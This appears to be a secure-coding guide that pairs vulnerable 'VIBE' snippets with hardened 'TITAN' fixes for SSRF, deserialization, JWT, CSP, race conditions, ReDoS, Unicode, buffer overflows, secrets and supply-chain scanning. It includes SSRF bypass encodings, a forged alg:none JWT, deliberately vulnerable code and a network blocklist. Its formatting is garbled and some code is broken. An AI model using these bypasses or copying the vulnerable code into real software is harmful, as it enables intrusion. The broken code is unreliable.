    self.challenge = base64.urlsafe_b64encode(digest).rstrip(b'=').decode('ascii')
    return self.challenge
    
    def build_auth_url(self, auth_endpoint, client_id, redirect_uri, scope):
            self.generate_verifier()
            self.generate_challenge()
    
    params = {
    'response_type': 'code',
    'client_id': client_id,
    'redirect_uri': redirect_uri,
    'scope': scope,
    'code_challenge': self.challenge,
    'code_challenge_method': 'S256',
    'state': secrets.token_urlsafe(16)  # CSRF protection
            }
    return f"{auth_endpoint}?" + urlencode(params)
    
    def exchange_code(self, token_endpoint, code, client_id, redirect_uri):
    
    ## Include verifier in token request
    response = requests.post(token_endpoint, data={
    'grant_type': 'authorization_code',
    'code': code,
    'client_id': client_id,
    'redirect_uri': redirect_uri,
    'code_verifier': self.verifier  # Server verifies this
            })
    return response.json()
    

## SSRF BYPASS TECHNIQUES

## IP Address Bypass Scar

> "SSRF filter blocks 127.0.0.1 and localhost.
> Attacker uses: 0177.0.0.1 (octal), 2130706433 (decimal), 0x7f.0.0.1 (hex).
> Or: DNS rebinding - first request resolves external, second resolves internal.
> Defense in depth: Block at network level + resolve before fetch."

    
    ## TITAN: Comprehensive SSRF Protection
    
    import socket
    import ipaddress
    from urllib.parse import urlparse
    
    BLOCKED_NETWORKS = [
    ipaddress.ip_network('127.0.0.0/8'), # Loopback
    ipaddress.ip_network('10.0.0.0/8'), # Private
    ipaddress.ip_network('172.16.0.0/12'), # Private
    ipaddress.ip_network('192.168.0.0/16'), # Private
    ipaddress.ip_network('169.254.0.0/16'), # Link-local (IMDS!)
    ipaddress.ip_network('::1/128'), # IPv6 loopback
    ipaddress.ip_network('fc00::/7'), # IPv6 private
    ]
    
    class SSRFSafeHTTPClient:
    def **init**(self):
    self.dns_cache = {}  # Pin DNS to prevent rebinding
    
    def is_safe_url(self, url):
    parsed = urlparse(url)
    hostname = parsed.hostname
    
    if not hostname:
    return False
    
    ## Block file:// and other dangerous schemes
    
    if parsed.scheme not in ('http', 'https'):
    return False
    
            try:
    
    ## Resolve BEFORE making request (prevents DNS rebinding)
    
    ip_str = socket.gethostbyname(hostname)
    ip = ipaddress.ip_address(ip_str)
    
    ## Check against blocklist
    
    for network in BLOCKED_NETWORKS:
    if ip in network:
    return False
    
    ## Cache DNS result to prevent rebinding between check and use
    
    self.dns_cache[hostname] = ip_str
    return True
    
    except socket.gaierror:
    return False
    
    def fetch(self, url):
    if not self.is_safe_url(url):
    raise SSRFError(f"Blocked URL: {url}")
    
    ## Use cached IP to prevent DNS rebinding
    parsed = urlparse(url)
    safe_url = url.replace(
            parsed.hostname,
    self.dns_cache.get(parsed.hostname, parsed.hostname)
            )
    
    return requests.get(safe_url, timeout=5)
    

## DESERIALIZATION ATTACKS

## Object Injection Deep Dive

> "pickle.loads(): Executes arbitrary code during deserialization.
> YAML: load() is unsafe. Use safe_load().
> Java: Gadget chains in classpath = RCE.
> Rule: Never deserialize untrusted data."

    
    ## VIBE: Arbitrary code execution
    
    import pickle
    data = request.get_json()['data']
    obj = pickle.loads(base64.b64decode(data))  # RCE!
    
    ## VIBE: YAML load is unsafe
    
    import yaml
    config = yaml.load(user_input)  # RCE via !!python/object
    
    ## TITAN: Safe alternatives
    
    import json
    
    ## JSON is safe (no code execution)
    
    obj = json.loads(user_input)
    
    ## If schema needed, use explicit parsing
    
    from pydantic import BaseModel
    
    class UserInput(BaseModel):
    name: str
    age: int
    
    validated = UserInput.parse_raw(user_input)
    
    ## If you MUST deserialize complex objects
    
    import jsonpickle
    jsonpickle.set_decoder_options('json', cls=SafeDecoder)
    
    ## Plus: Whitelist of allowed classes
    

## TITAN: Safe YAML

import yaml

## Always use safe_load

config = yaml.safe_load(user_input)

## For custom objects, be explicit

class SafeLoader(yaml.SafeLoader):
        pass

## Only allow specific types

SafeLoader.yaml_constructors = {
'tag:yaml.org,2002:map': SafeLoader.construct_yaml_map,
'tag:yaml.org,2002:str': SafeLoader.construct_yaml_str,
'tag:yaml.org,2002:int': SafeLoader.construct_yaml_int,
}

config = yaml.load(user_input, Loader=SafeLoader)

    
    ## CSP BYPASS TECHNIQUES
    
    ## Content Security Policy Evasion
    
    > "CSP blocks inline scripts. But: JSONP endpoints, Angular ng-csp, base-uri hijacking.
    > 'unsafe-eval' allows eval(). 'unsafe-inline' defeats purpose.
    > Nonce-based CSP: Only scripts with matching nonce execute."
    

<!-- VIBE: Overly permissive CSP -->
<meta http-equiv="Content-Security-Policy"
content="script-src 'self' <<https://cdn.example.com">>>
<!-- Attacker finds JSONP on cdn.example.com XSS -->

<!-- TITAN: Strict nonce-based CSP -->
<meta http-equiv="Content-Security-Policy"
content="default-src 'self';
script-src 'nonce-R4nd0mN0nc3' 'strict-dynamic';
style-src 'self' 'unsafe-inline';
base-uri 'self';
form-action 'self';">

<!-- Only this script executes -->
<script nonce="R4nd0mN0nc3">
// Legitimate code
</script>

    
    ## TITAN: Server-side nonce generation
    
    import secrets
    
    def generate_csp_nonce():
    return secrets.token_urlsafe(16)
    
    @app.before_request
    def set_csp():
    nonce = generate_csp_nonce()
    g.csp_nonce = nonce
    
    @app.after_request
    def add_csp_header(response):
    csp = (
    f"default-src 'self'; "
    f"script-src 'nonce-{g.csp_nonce}' 'strict-dynamic'; "
    f"style-src 'self' 'unsafe-inline'; "
    f"base-uri 'self'; "
    f"form-action 'self'; "
    f"frame-ancestors 'none'; "
            f"upgrade-insecure-requests"
        )
    response.headers['Content-Security-Policy'] = csp
    return response
    

## RACE CONDITION VULNERABILITIES

## Time-of-Check to Time-of-Use (TOCTOU)

> "Check balance: $100. Debit: $50. User sends 2 requests simultaneously.
> Both checks pass (both see $100). Both debits succeed. Balance: -$50.
> Race window: Between read and write.
> Fix: Atomic operations or database-level locking."

    
    ## VIBE: Race condition vulnerable
    
    async def transfer(from_account, to_account, amount):
    
    ## Check
    
    balance = await db.get_balance(from_account)
    if balance >= amount:  # Race window starts
    
    ## Time
    
    await db.update_balance(from_account, balance - amount)
    await db.update_balance(to_account, amount)  # Race window ends
    return True
    return False
    
    ## TITAN: Atomic operation with row locking
    
    async def transfer(from_account, to_account, amount):
    async with db.transaction():
    
    ## SELECT FOR UPDATE locks the row
    
    result = await db.execute("""
    UPDATE accounts
    SET balance = balance - $1
    WHERE id = $2 AND balance >= $1
    RETURNING balance
    """, amount, from_account)
    
    if result.rowcount == 0:
    raise InsufficientFunds()
    
    await db.execute("""
    UPDATE accounts
    SET balance = balance + $1
    WHERE id = $2
    """, amount, to_account)
    
    ## TITAN: Optimistic locking with version
    
    async def update_with_cas(id, expected_version, new_data):
    result = await db.execute("""
    UPDATE records
    SET data = $1, version = version + 1
    WHERE id = $2 AND version = $3
    """, new_data, id, expected_version)
    
    if result.rowcount == 0:
    raise ConcurrentModificationError("Retry required")
    

## END OF VOLUME 1.6: TITAN DEEP INTERNALS - APPLICATION SECURITY MECHANICS

---

## VOLUME 1.7: TITAN GEMINI RESEARCH - ADVANCED ATTACK PATTERNS

## JWT NONE ALGORITHM ATTACK

### The Scar

> "JWT library accepts 'alg': 'none'.
> Attacker forges token without signature. Backend trusts it.
> Full authentication bypass. All users compromised."

    
    ## VIBE: Accepts any algorithm
    
    import jwt
    
    def verify_token(token):
    
    ## VULNERABLE: algorithms not specified
    
    payload = jwt.decode(token, secret_key)  # Accepts 'none'!
    return payload
    
    ## Attacker creates
    
    ## Header: {"alg": "none", "typ": "JWT"}
    
    ## Payload: {"sub": "admin", "role": "superuser"}
    
    ## Signature: (empty)
    
    ## Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcnVzZXIifQ
    

## TITAN: Explicit algorithm whitelist

import jwt
from jwt.exceptions import InvalidAlgorithmError

ALLOWED_ALGORITHMS = ['RS256', 'ES256']  # NEVER 'none', NEVER 'HS256' with RSA key

def verify_token(token: str, public_key: str):
        try:
payload = jwt.decode(
        token,
        public_key,
algorithms=ALLOWED_ALGORITHMS, # EXPLICIT whitelist!
        options={
'require': ['exp', 'iat', 'sub'],  # Required claims
'verify_exp': True,
'verify_iat': True
        }
        )
return payload
except jwt.InvalidTokenError as e:
raise AuthenticationError(f"Invalid token: {e}")

## TITAN: Prevent algorithm confusion (RS256 vs HS256)

## If using RS256 (asymmetric), attacker might

## 1. Get public key (often exposed)

## 2. Sign token with HS256 using public key as secret

## 3. Server verifies with same "secret" = valid signature

## Defense: NEVER use same key handling for both

def verify_token_safe(token: str):
header = jwt.get_unverified_header(token)

if header['alg'] not in ALLOWED_ALGORITHMS:
raise AuthenticationError(f"Algorithm not allowed: {header['alg']}")

## Use correct key based on algorithm

if header['alg'].startswith('RS') or header['alg'].startswith('ES'):
key = PUBLIC_KEY
    else:
key = HMAC_SECRET

return jwt.decode(token, key, algorithms=[header['alg']])

    
    ## TIMING ATTACKS AGAINST STRING COMPARISON
    
    ## The Scar 2
    
    > "Deployed to production. Image pulled from registry.
    > Someone had pushed a backdoored image with same tag.
    > No signature verification. Running attacker's code.
    > Detected 3 weeks later during security audit."
    

## VIBE: Timing-vulnerable comparison

def verify_api_key(provided_key, stored_key):
return provided_key == stored_key  # VULNERABLE!

## First character mismatch: ~100ns

## Last character mismatch: ~1000ns

## Attacker can detect the difference

## VIBE: Early return on mismatch

def verify_api_key_bad(provided, stored):
if len(provided) != len(stored):
return False
for i in range(len(provided)):
if provided[i] != stored[i]:
return False  # Returns early = timing leak!
return True

    
    ## TITAN: Constant-time comparison 2
    
    import hmac
    import secrets
    
    def verify_api_key(provided_key: str, stored_key: str) -> bool:
    
    ## hmac.compare_digest is constant-time
    
    ## Takes same time regardless of where mismatch occurs
    
    return hmac.compare_digest(
            provided_key.encode('utf-8'),
            stored_key.encode('utf-8')
        )
    
    ## TITAN: For hashed passwords, use dedicated library
    
    from passlib.hash import argon2
    
    def verify_password(provided: str, hashed: str) -> bool:
    
    ## argon2.verify is constant-time internally
    
    return argon2.verify(provided, hashed)
    
    ## TITAN: Node.js constant-time comparison
    
    ## const crypto = require('crypto');
    
    #
    
    ## function verifyApiKey(provided, stored) {
    
    ## // crypto.timingSafeEqual is constant-time
    
    ## const a = Buffer.from(provided);
    
    ## const b = Buffer.from(stored);
    
    # 2
    
    ## 2
    
    ## if (a.length !== b.length) {
    
    ## // Still compare to prevent length oracle
    
    ## return crypto.timingSafeEqual(a, a) && false;
    
    ## }
    

## 3

## return crypto.timingSafeEqual(a, b);

## } 2 2

## REDOS - REGEX DENIAL OF SERVICE

## The Scar 2 2

> "Email validation regex: ^([a-zA-Z0-9]+)+@example.com$
> Attacker input: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!'
> Regex engine backtracks 2^28 times. Server hangs.
> CPU 100% for minutes on single request."

## VIBE: Catastrophic backtracking patterns

import re

## These regexes have exponential backtracking

BAD_EMAIL = r'^([a-zA-Z0-9]+)+@'  # Nested quantifiers
BAD_URL = r'^(https?://)?(\w+\.)+\w+$'  # Nested quantifiers
BAD_HTML = r'<.*>.*</.*>'  # Greedy with overlap

def validate_email(email):

## With input: 'a' *30 + '!'

## Takes MINUTES to return False

return re.match(BAD_EMAIL + r'example\.com$', email)

    
    ## TITAN: Safe regex patterns
    
    import re
    
    ## Use possessive quantifiers or atomic groups (not in Python re)
    
    ## Or rewrite to avoid nested quantifiers
    
    ## Safe email validation (no nested quantifiers)
    
    SAFE_EMAIL = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    
    ## TITAN: Use regex with timeouts
    
    import signal
    
    class TimeoutError(Exception):
            pass
    
    def timeout_handler(signum, frame):
    raise TimeoutError("Regex timeout")
    
    def safe_regex_match(pattern, string, timeout=1):
    signal.signal(signal.SIGALRM, timeout_handler)
            signal.alarm(timeout)
            try:
    return re.match(pattern, string)
    except TimeoutError:
    return None
            finally:
            signal.alarm(0)
    
    ## TITAN: Use linear-time regex engine
    
    import google_re2 as re2  # Google RE2 guarantees linear time
    
    def validate_input(pattern, text):
    
    ## RE2 uses finite automata, no backtracking
    
    ## Guaranteed O(n) time complexity
    
    return re2.match(pattern, text)
    
    ## TITAN: Pre-validate input length
    
    MAX_INPUT_LENGTH = 1000
    
    def validate_with_guard(pattern, text):
    if len(text) > MAX_INPUT_LENGTH:
    raise ValueError("Input too long")
    return re.match(pattern, text)
    

## UNICODE NORMALIZATION ATTACKS

## The Scar 3

> "Username filter blocks 'admin'. Attacker registers (script
> After Unicode normalization, displays as 'admin'.
> Or: File path with %c0%ae%c0%ae becomes '..' after normalization.
> Directory traversal bypasses security filter."

## VIBE: Filter before normalization

def check_username(username):
if username.lower() == 'admin':
raise ValueError("Reserved username")

## Save to database (which normalizes Unicode)

return username

## Attacker passes: (circled letters)

## Filter passes. Database normalizes to 'admin'

    
    ## TITAN: Normalize BEFORE checking
    
    import unicodedata
    
    def sanitize_username(username: str) -> str:
    
    ## Normalize to NFKC (compatibility composition)
    
    ## Converts l, a, III, etc
    
    normalized = unicodedata.normalize('NFKC', username)
    
    ## Remove zero-width characters (invisible)
    
    ## U+200B (zero-width space), U+200C (ZWNJ), U+200D (ZWJ), U+FEFF (BOM)
    
    invisible_chars = ['\u200b', '\u200c', '\u200d', '\ufeff', '\u00ad']
    for char in invisible_chars:
    normalized = normalized.replace(char, '')
    
    ## Now check against reserved names
    
    if normalized.lower() in ['admin', 'root', 'system']:
    raise ValueError("Reserved username")
    
    return normalized
    
    ## TITAN: Confusable character detection
    
    from confusables import is_confusable, normalize
    
    def check_homograph(input_str, protected_str):
    
    ## Detect visually similar characters
    
    ## (Cyrillic vs 'paypal.com' (Latin 'a')
    
    return is_confusable(input_str, protected_str)
    
    ## TITAN: Locale-aware case conversion (Turkish problem)
    
    def safe_lowercase(text: str, locale: str = 'en') -> str:
    
    ## Turkish: 'I'.lower() should be (dotless i), not 'i'
    
    ## Don't use .lower() for security comparisons
    
    import icu  # PyICU
    return icu.UnicodeString(text).toLower(icu.Locale(locale))
    
    ## BUFFER OVERFLOW PREVENTION PATTERNS
    
    ## The Scar 4
    
    > "C function uses strcpy() without bounds checking.
    > Attacker input overwrites return address.
    > Arbitrary code execution. Full system compromise."
    
    // VIBE: Unbounded copy
    void vulnerable(char*input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
    }
    
    // VIBE: Off-by-one in loop
    void off_by_one(char *input) {
    char buffer[64];
    for (int i = 0; i <= 64; i++) {  // Should be < 64
    buffer[i] = input[i];
        }
    }
    
    // TITAN: Bounded string operations
    
    ## include <string.h>
    
    void safe_copy(char *input) {
    char buffer[64];
    
    // strncpy with explicit size
    strncpy(buffer, input, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\0';  // Ensure null termination
    
    // Or use strlcpy (BSD) / strcpy_s (Windows)
    // strlcpy(buffer, input, sizeof(buffer));
    }
    
    // TITAN: Use stack canaries and ASLR
    // Compile with:
    // gcc -fstack-protector-all -pie -fPIE -D_FORTIFY_SOURCE=2 program.c
    
    // TITAN: In Rust, memory safety by default
    // fn safe_buffer(input: &str) -> String {
    // let mut buffer = String::with_capacity(64);
    // buffer.push_str(&input[..input.len().min(64)]);
    // buffer
    // }
    

## END OF VOLUME 1.7: TITAN GEMINI RESEARCH - ADVANCED ATTACK PATTERNS

---

## VOLUME 2: TITAN GEMINI RESEARCH - AUTH AND SECRETS PRODUCTION

## JWT SECURITY PITFALLS

### The Scar 3 2

> "JWT token validated signature. Accepted `alg: none`.
> Attacker removes signature, sets alg to 'none'.
> Token accepted. Admin access granted.
> Library had algorithm confusion vulnerability."

    // VIBE: Accept any algorithm
    import jwt from 'jsonwebtoken';
    
    function verifyToken(token: string) {
    return jwt.verify(token, SECRET_KEY);  // Accepts ANY algorithm!
    }
    // Attacker sets header: {"alg": "none"}, removes signature = valid token
    

// TITAN: Strict JWT verification
import jwt, { JwtPayload, Algorithm } from 'jsonwebtoken';

interface TokenPayload extends JwtPayload {
sub: string;
role: string;
permissions: string[];
}

class JWTService {
private readonly secretKey: string;
private readonly allowedAlgorithms: Algorithm[] = ['HS256', 'HS384', 'HS512'];
private readonly issuer: string;
private readonly audience: string;

constructor(config: {
secretKey: string;
issuer: string;
audience: string;
}) {
this.secretKey = config.secretKey;
this.issuer = config.issuer;
this.audience = config.audience;
    }

| sign(payload: Omit<TokenPayload, 'iat' | 'exp' | 'iss' | 'aud'>): string { |
return jwt.sign(
        {
        ...payload,
iss: this.issuer,
aud: this.audience,
        },
        this.secretKey,
        {
algorithm: 'HS256',  // Explicit algorithm
expiresIn: '15m',    // Short-lived access tokens
notBefore: 0,  // Valid immediately
        }
        );
    }

verify(token: string): TokenPayload {
try {
const decoded = jwt.verify(token, this.secretKey, {
algorithms: this.allowedAlgorithms,  // CRITICAL: Whitelist algorithms
issuer: this.issuer,  // Verify issuer
audience: this.audience,  // Verify audience
clockTolerance: 30,  // 30 second tolerance
}) as TokenPayload;

// Additional checks
| if (!decoded.sub |  | typeof decoded.sub !== 'string') { |
throw new Error('Invalid subject claim');
        }

return decoded;

} catch (error) {
if (error instanceof jwt.TokenExpiredError) {
throw new AuthError('Token expired', 'TOKEN_EXPIRED');
        }
if (error instanceof jwt.JsonWebTokenError) {
throw new AuthError('Invalid token', 'INVALID_TOKEN');
        }
throw error;
        }
    }

// Refresh token with rotation
createRefreshToken(userId: string): string {
const tokenId = crypto.randomUUID();

// Store in database for revocation
await this.tokenStore.save({
id: tokenId,
        userId,
createdAt: new Date(),
expiresAt: new Date(Date.now() + 7 *24*60*60* 1000),  // 7 days
        });

return jwt.sign(
{ sub: userId, jti: tokenId },
        this.secretKey,
{ algorithm: 'HS256', expiresIn: '7d' }
        );
    }

async rotateRefreshToken(oldToken: string): Promise<{ accessToken: string; refreshToken: string }> {
const decoded = this.verify(oldToken);

// Revoke old token
await this.tokenStore.revoke(decoded.jti);

// Check if already revoked (token reuse attack)
const stored = await this.tokenStore.get(decoded.jti);
| if (!stored |  | stored.revokedAt) { |
// Potential attack - revoke ALL user tokens
await this.tokenStore.revokeAllForUser(decoded.sub);
throw new AuthError('Token reuse detected', 'TOKEN_REUSE');
        }

// Issue new tokens
return {
accessToken: this.sign({ sub: decoded.sub, role: decoded.role, permissions: decoded.permissions }),
refreshToken: this.createRefreshToken(decoded.sub),
        };
    }
}

    
    ## SECRETS MANAGEMENT WITH VAULT
    
    ### The Scar 4 2
    
    > "API keys in .env file. Committed to GitHub.
    > Private repo. Then made public for portfolio.
    > AWS keys exposed. $50k bill overnight.
    > Crypto miners spun up hundreds of instances."
    

## VIBE: Hardcoded secrets

import os

AWS_KEY = "AKIAIOSFODNN7EXAMPLE"  # Hardcoded!
AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"  # Hardcoded!

## Or slightly better but still dangerous

AWS_KEY = os.getenv("AWS_KEY")  # In .env, might get committed

    
    ## TITAN: HashiCorp Vault integration
    
    import hvac
    from functools import lru_cache
    from datetime import datetime, timedelta
    import logging
    
    class VaultSecretManager:
    """Production secrets management with HashiCorp Vault."""
    
    def **init**(self, vault_addr: str, auth_method: str = 'kubernetes'):
    self.client = hvac.Client(url=vault_addr)
    self.auth_method = auth_method
    self.lease_cache: dict[str, tuple[dict, datetime]] = {}
    
    ## Authenticate based on environment
    
            self._authenticate()
    
    def _authenticate(self):
    """Authenticate to Vault using appropriate method."""
    
    if self.auth_method == 'kubernetes':
    
    ## Read service account token
    
    with open('/var/run/secrets/kubernetes.io/serviceaccount/token') as f:
    jwt = f.read()
    
            self.client.auth.kubernetes.login(
            role='myapp',
            jwt=jwt
            )
    
    elif self.auth_method == 'aws':
    
    ## IAM authentication
    
            self.client.auth.aws.iam_login(
            role='myapp',
            mount_point='aws'
            )
    
    elif self.auth_method == 'approle':
    
    ## For CI/CD
    
    import os
            self.client.auth.approle.login(
            role_id=os.environ['VAULT_ROLE_ID'],
            secret_id=os.environ['VAULT_SECRET_ID']
            )
    
    def get_secret(self, path: str, key: str) -> str:
    """Get a secret value with caching and lease management."""
    
    ## Check cache
    
    cache_key = f"{path}:{key}"
    if cache_key in self.lease_cache:
    secret, expires_at = self.lease_cache[cache_key]
    if datetime.now() < expires_at:
    return secret[key]
    
    ## Fetch from Vault
    
    response = self.client.secrets.kv.v2.read_secret_version(
            path=path,
            mount_point='secret'
            )
    
    secret = response['data']['data']
    
    ## Cache with lease
    
    lease_duration = response.get('lease_duration', 3600)
    expires_at = datetime.now() + timedelta(seconds=lease_duration - 60)  # 60s buffer
    self.lease_cache[cache_key] = (secret, expires_at)
    
    return secret[key]
    
    def get_dynamic_database_credentials(self, role: str) -> tuple[str, str]:
    """Get dynamic database credentials (auto-rotating)."""
    
    response = self.client.secrets.database.generate_credentials(
            name=role,
            mount_point='database'
            )
    
    username = response['data']['username']
    password = response['data']['password']
    
    ## Log for audit
    
    logging.info(f"Generated dynamic DB creds for role {role}, lease_id: {response['lease_id']}")
    
    return username, password
    
    def rotate_api_key(self, key_name: str) -> str:
    """Rotate an API key with zero downtime."""
    
    ## 1. Generate new key
    
    new_key = secrets.token_urlsafe(32)
    
    ## 2. Read current key
    
    current = self.get_secret(f'api-keys/{key_name}', 'current')
    
    ## 3. Update Vault with both keys active
    
            self.client.secrets.kv.v2.create_or_update_secret(
            path=f'api-keys/{key_name}',
            secret={
    'current': new_key,
    'previous': current,  # Keep old key valid temporarily
    'rotated_at': datetime.now().isoformat()
            },
            mount_point='secret'
            )
    
    return new_key
    
    ## Usage
    
    vault = VaultSecretManager(
            vault_addr='<<<<<<https://vault.company.com',>>>>>>
            auth_method='kubernetes'
        )
    
    ## Get static secret
    
    api_key = vault.get_secret('myapp/config', 'stripe_api_key')
    
    ## Get dynamic database credentials
    
    db_user, db_pass = vault.get_dynamic_database_credentials('myapp-readonly')
    

## API KEY ROTATION

## The Scar 5

> "Same API key for 3 years. Never rotated.
> Employee left, still had the key.
> Used it from competitor company.
> No audit trail. Couldn't prove breach source."

## VIBE: Static API keys

API_KEY = "static_key_never_changes_123"

@app.get("/api/data")
def get_data(api_key: str = Header()):
if api_key != API_KEY:
raise HTTPException(401)
return {"data": "secret"}

    
    ## TITAN: Rotating API keys with audit trail
    
    from datetime import datetime, timedelta
    from typing import Optional
    import hashlib
    import secrets
    
    class APIKeyManager:
    """Production API key management with rotation and audit."""
    
    def **init**(self, db, redis):
    self.db = db
    self.redis = redis
    
    async def create_api_key(
            self,
    user_id: str,
    name: str,
    permissions: list[str],
    expires_in_days: int = 365
    ) -> tuple[str, str]:
    """Create new API key. Returns (key_id, secret) - secret shown only once!"""
    
    ## Generate key components
    
    key_id = f"sk_{secrets.token_urlsafe(8)}"
    key_secret = secrets.token_urlsafe(32)
    key_hash = self._hash_key(key_secret)
    
    ## Store in database (NEVER store the secret!)
    
    await self.db.api_keys.create(
            data={
    'id': key_id,
    'user_id': user_id,
    'name': name,
    'key_hash': key_hash,
    'permissions': permissions,
    'created_at': datetime.utcnow(),
    'expires_at': datetime.utcnow() + timedelta(days=expires_in_days),
    'last_used_at': None,
    'rotation_reminder_sent': False
            }
            )
    
    ## Audit log
    
    await self._audit_log(user_id, 'API_KEY_CREATED', {'key_id': key_id, 'name': name})
    
    ## Return full key (only time it's visible)
    
    full_key = f"{key_id}.{key_secret}"
    return key_id, full_key
    
    async def validate_key(self, full_key: str) -> Optional[dict]:
    """Validate API key and return permissions."""
    
            try:
    key_id, key_secret = full_key.split('.', 1)
    except ValueError:
    return None
    
    ## Check cache first
    
    cache_key = f"apikey:{key_id}"
    cached = await self.redis.get(cache_key)
    
    if cached:
    key_data = json.loads(cached)
            else:
    
    ## Fetch from database
    
    key_data = await self.db.api_keys.find_unique(
    where={'id': key_id}
            )
    
    if not key_data:
    return None
    
    ## Cache for 5 minutes
    
    await self.redis.setex(cache_key, 300, json.dumps(key_data))
    
    ## Verify hash
    
    if not self._verify_key(key_secret, key_data['key_hash']):
    await self._audit_log(None, 'API_KEY_INVALID_SECRET', {'key_id': key_id})
    return None
    
    ## Check expiration
    
    if datetime.fromisoformat(key_data['expires_at']) < datetime.utcnow():
    await self._audit_log(key_data['user_id'], 'API_KEY_EXPIRED', {'key_id': key_id})
    return None
    
    ## Check if revoked
    
    if key_data.get('revoked_at'):
    return None
    
    ## Update last used (async, don't block request)
    
            asyncio.create_task(self._update_last_used(key_id))
    
    return {
    'user_id': key_data['user_id'],
    'permissions': key_data['permissions'],
    'key_id': key_id
            }
    
    async def rotate_key(self, key_id: str) -> tuple[str, str]:
    """Rotate API key with grace period for old key."""
    
    old_key = await self.db.api_keys.find_unique(where={'id': key_id})
    
    if not old_key:
    raise ValueError("Key not found")
    
    ## Create new key
    
    new_key_id, new_full_key = await self.create_api_key(
            user_id=old_key['user_id'],
    name=f"{old_key['name']} (rotated)",
            permissions=old_key['permissions']
            )
    
    ## Mark old key for deprecation (still valid for 24 hours)
    
    await self.db.api_keys.update(
    where={'id': key_id},
            data={
    'deprecated_at': datetime.utcnow(),
    'expires_at': datetime.utcnow() + timedelta(hours=24)
            }
            )
    
    ## Invalidate cache
    await self.redis.delete(f"apikey:{key_id}")
    
    await self._audit_log(
            old_key['user_id'],
            'API_KEY_ROTATED',
    {'old_key_id': key_id, 'new_key_id': new_key_id}
            )
    
    return new_key_id, new_full_key
    
    def _hash_key(self, secret: str) -> str:
    """Hash API key secret for storage."""
    return hashlib.pbkdf2_hmac(
            'sha256',
            secret.encode(),
    b'api_key_salt_xyz', # Use proper salt from config
            100000
            ).hex()
    
    def _verify_key(self, secret: str, stored_hash: str) -> bool:
    """Verify key secret against stored hash."""
    return secrets.compare_digest(
            self._hash_key(secret),
            stored_hash
            )
    

## END OF VOLUME 2: TITAN GEMINI RESEARCH - AUTH AND SECRETS PRODUCTION

---

## VOLUME 3: TITAN GEMINI RESEARCH - SUPPLY CHAIN SECURITY

## DEPENDENCY VULNERABILITY DISASTERS

### The Scar 5 2

> "Log4Shell announced. Checked: we use log4j.
> Where? 47 different services. Transitive dependency.
> No SBOM. No dependency graph. Manual audit.
> Took 2 weeks to find and patch everywhere."

    
    ## VIBE: No dependency scanning
    
    ## Just run npm install and hope nothing bad happens
    

## TITAN: GitHub Actions with dependency scanning and SBOM

name: Security Pipeline

    on:
      push:
branches: [main]
      pull_request:
      schedule:

- cron: '0 6 * * *'  # Daily vulnerability check

    jobs:
      dependency-scan:
runs-on: ubuntu-latest
        steps:

- uses: actions/checkout@v4

## Generate SBOM (Software Bill of Materials)

- name: Generate SBOM

uses: anchore/sbom-action@v0
        with:
path: .
format: spdx-json
output-file: sbom.spdx.json

## Scan for vulnerabilities

- name: Vulnerability Scan

uses: anchore/scan-action@v3
        with:
sbom: sbom.spdx.json
fail-build: true
severity-cutoff: high

## Check for known malicious packages

- name: Malware Scan

| run: |
npx lockfile-lint --path package-lock.json \
--validate-https \
--validate-package-names \
        --validate-checksum

## Upload SBOM as artifact

- uses: actions/upload-artifact@v3

        with:
name: sbom
path: sbom.spdx.json

## Attest SBOM for provenance

- uses: actions/attest-sbom@v1

        with:
subject-path: sbom.spdx.json
sbom-path: sbom.spdx.json

      container-security:
runs-on: ubuntu-latest
        steps:

- uses: actions/checkout@v4

- name: Build image

run: docker build -t myapp:${{ github.sha }} .

## Scan container image

- name: Trivy container scan

uses: aquasecurity/trivy-action@master
        with:
image-ref: myapp:${{ github.sha }}
format: sarif
output: trivy-results.sarif
severity: 'CRITICAL,HIGH'
exit-code: 1

## Upload scan results

- uses: github/codeql-action/upload-sarif@v2

        with:
sarif_file: trivy-results.sarif

    
    ## TITAN: Continuous dependency monitoring
    
    from dataclasses import dataclass
    from datetime import datetime
    import subprocess
    import json
    
    @dataclass
    class VulnerabilityAlert:
    package: str
    version: str
    severity: str
    cve_id: str
    | fixed_version: str | None |
    affected_services: list[str]
    
    class DependencyMonitor:
    def **init**(self, github_token: str, slack_webhook: str):
    self.github = github_token
    self.slack = slack_webhook
    self.known_vulns: set[str] = set()
    
    async def scan_monorepo(self, repo_path: str) -> list[VulnerabilityAlert]:
    """Scan all services in monorepo for vulnerabilities."""
    alerts = []
    
    ## Find all package.json files
    
    result = subprocess.run(
    ['find', repo_path, '-name', 'package.json', '-not', '-path', '*/node_modules/*'],
    capture_output=True, text=True
            )
    
    package_files = result.stdout.strip().split('\n')
    
    for pkg_file in package_files:
    service_name = pkg_file.split('/')[-2]
    
    ## Run npm audit
    
    audit_result = subprocess.run(
    ['npm', 'audit', '--json'],
    cwd=pkg_file.rsplit('/', 1)[0],
    capture_output=True, text=True
            )
    
            try:
    audit_data = json.loads(audit_result.stdout)
    
    for vuln_id, vuln_info in audit_data.get('vulnerabilities', {}).items():
    if vuln_info['severity'] in ['high', 'critical']:
    alert = VulnerabilityAlert(
            package=vuln_id,
    version=vuln_info.get('range', 'unknown'),
            severity=vuln_info['severity'],
    cve_id=vuln_info.get('via', [{}])[0].get('cve', 'N/A'),
    fixed_version=vuln_info.get('fixAvailable', {}).get('version'),
            affected_services=[service_name]
            )
    
    ## Deduplicate
    alert_key = f"{alert.package}:{alert.cve_id}"
    if alert_key not in self.known_vulns:
            alerts.append(alert)
            self.known_vulns.add(alert_key)
    except json.JSONDecodeError:
            continue
    
    return alerts
    
    async def notify_security_team(self, alerts: list[VulnerabilityAlert]):
    """Send Slack notification for new vulnerabilities."""
    if not alerts:
            return
    
    critical = [a for a in alerts if a.severity == 'critical']
    high = [a for a in alerts if a.severity == 'high']
    
    message = {
    "blocks": [
            {
    "type": "header",
    "text": {
    "type": "plain_text",
    "text": {len(alerts)} New Vulnerabilities Detected"
            }
            },
            {
    "type": "section",
    "text": {
    "type": "mrkdwn",
    | "text": f"*Critical:*{len(critical)} | *High:* {len(high)}" |
            }
            }
            ]
            }
    
    for alert in critical[:5]:  # Top 5 critical
